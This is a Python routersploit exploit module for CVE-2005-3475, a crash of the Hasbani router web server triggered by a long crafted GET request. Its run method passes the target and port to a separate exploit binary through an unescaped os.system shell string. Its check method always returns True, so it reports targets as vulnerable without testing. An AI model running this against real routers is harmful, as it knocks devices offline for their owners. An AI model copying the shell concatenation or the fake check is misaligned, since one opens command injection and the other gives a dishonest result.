
import sys,os
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):


    __info__ = {
        "name": "CVE-2005-3475",

        "description": "Hasbani server is a httpd created for menaging ethernet routers and adsl modems. "
                       "Hasbani enter a loop in a GET /..:..:..etc. condition, causes that when an attacker reguest a long crafted string "
                       "server enter an endless loop with conseguenly crash of the httpd."
                       "NOTE: This exploit DON'T drop down victim's adsl connection! ",

        "authors": (

            "Expanders",  # vulnerability discovery

            "###",  # routersploit module

        ),

        "references": (

            "https://www.exploit-db.com/exploits/1274",

        ),

        "devices": (

            "Hasbani, CVE-2005-3475"
        ),
    }


    target = OptIP("", "host ip IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    
    def run(self):

        if self.check():

            print_success("Target seems to be vulnerable")
            text = os.path.basename(__file__)
            print(text)
            path = os.path.realpath(__file__)
            path = path.replace(text,'')
            path = path.replace('\\','/')
            path1 = 'cd {}'.format(path)
            fileName = './{} {} {}'.format('exploit-db-1274',self.target,self.port)
            path2 = path1 + " && " + fileName
            #print(path2)
            os.system(path2)
        else:

            print_error("Exploit failed - target seems to be not vulnerable")


    def check(self):
       
        return True